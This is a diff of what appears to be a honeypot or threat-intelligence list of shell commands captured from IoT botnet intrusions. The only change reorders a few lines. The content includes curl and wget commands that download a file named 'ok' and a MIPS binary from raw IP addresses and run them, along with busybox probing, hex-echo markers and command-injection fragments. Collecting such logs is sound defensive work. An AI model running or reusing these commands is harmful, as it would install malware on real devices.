@@ -14,8 +14,8 @@ su
 busybox uname -s -v -n -m 2 > /dev/null
 head -1 /proc/version | cut -d -f1
 uname -s -v -n -m 2 > /dev/null
-uname -s -v -n -r -m
 
+uname -s -v -n -r -m
 cd /tmp
 curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
@@ -35,7 +35,9 @@ echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
 id
 &k`g&k|zpkfq)ES[M
 g & k | zpkfq
+ping; sh
 uname -a
+/bin/busybox cat /proc/self/exe || cat /proc/self/exe
 exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
@@ -135,10 +137,8 @@ uname -a ; echo 'vT'
 User-Agent: python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.119.1.el7.x86_64
 echo 1 > /dev/null && cat /bin/echo
 lghkel
-ping; sh
 wget -nc http://45.87.174.8/k.php?a=mips,F4Y1MHNHN10C9X48H -O ./upnpsetup
 zpz}ld
-/bin/busybox cat /proc/self/exe || cat /proc/self/exe
 /bin/skhqwensw
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x42\x52\x4a\x55\x49'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x43\x54\x4a\x50\x44'
